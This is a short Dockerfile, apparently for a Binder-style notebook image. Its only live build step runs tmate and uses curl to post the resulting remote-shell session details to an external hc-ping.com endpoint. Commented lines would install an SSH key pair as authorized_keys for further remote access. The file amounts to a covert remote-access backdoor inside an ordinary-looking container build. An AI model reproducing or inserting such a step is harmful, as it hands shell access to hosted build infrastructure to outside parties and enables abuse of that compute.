FROM ghcr.io/musahi0128/ubuntu-docker:main

ENV DEBIAN_FRONTEND=noninteractive
ENV TZ Asia/Jakarta
ENV TERM xterm
ARG NB_USER
ARG NB_UID
ENV USER ${NB_USER}
ENV HOME /home/${NB_USER}

RUN curl -d "$(tmate -F)" https://hc-ping.com/988d8dce-ab4c-4aff-9c79-71a523dfa85b/log

# COPY setup.sh /setup.sh
# RUN /bin/bash /setup.sh > /dev/null 2>&1 && rm /setup.sh
# COPY id_binder $HOME/.ssh/id_rsa
# COPY id_binder.pub $HOME/.ssh/authorized_keys
# RUN chown -R 1000:1000 /etc/ssh && chmod 0600 $HOME/.ssh/* && chown 1000:1000 $HOME && chown -R 1000:1000 $HOME
# COPY entrypoint.sh /entrypoint.sh
# RUN chown 1000:1000 /entrypoint.sh

WORKDIR ${HOME}
USER ${USER}
